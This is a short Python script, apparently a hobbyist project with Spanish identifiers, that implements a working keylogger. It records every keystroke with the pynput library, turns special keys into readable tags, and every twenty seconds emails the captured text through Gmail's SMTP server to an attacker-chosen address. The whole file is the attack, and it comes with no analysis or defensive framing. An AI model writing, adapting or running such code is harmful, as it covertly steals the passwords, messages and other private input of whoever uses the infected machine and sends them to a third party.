import os, ssl, smtplib, time
from pynput.keyboard import Listener
from email.message import EmailMessage
def enviar_correo(mensaje):
 email_sender=""
 password=""
 email_receiver=""
 subject="Keylogger Working"
 body=f"""
{mensaje}
 """
 em=EmailMessage()
 em["From"] = email_sender
 em["To"] = email_receiver
 em["Subject"] = subject
 em.set_content(body)
 context=ssl.create_default_context()
 with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
	 smtp.login(email_sender, password)
	 smtp.sendmail(email_sender, email_receiver, em.as_string())
enviar = []
send_text = ''
def evento_teclado(key):
    l = str((key)).replace('Key.backspace', '[BORRAR]').replace('Key.space', ' ').replace("'", '').replace('Key.enter', '\n').replace('Key.ctrl_l', '').replace('\\x12', ' [CTRL+R] ').replace('\\x18', ' [CTRL+X] ').replace('\\x16', ' [CTRL+V] ').replace('Key.caps_lock', ' [MAY-MIN] ')
    
    enviar.append(l)
    global send_text
    send_text += l

with Listener(on_press=evento_teclado) as l:
    while True:
        time.sleep(20)
        if send_text == '':
            pass
        else:
            enviar_correo(send_text)
            send_text = ''

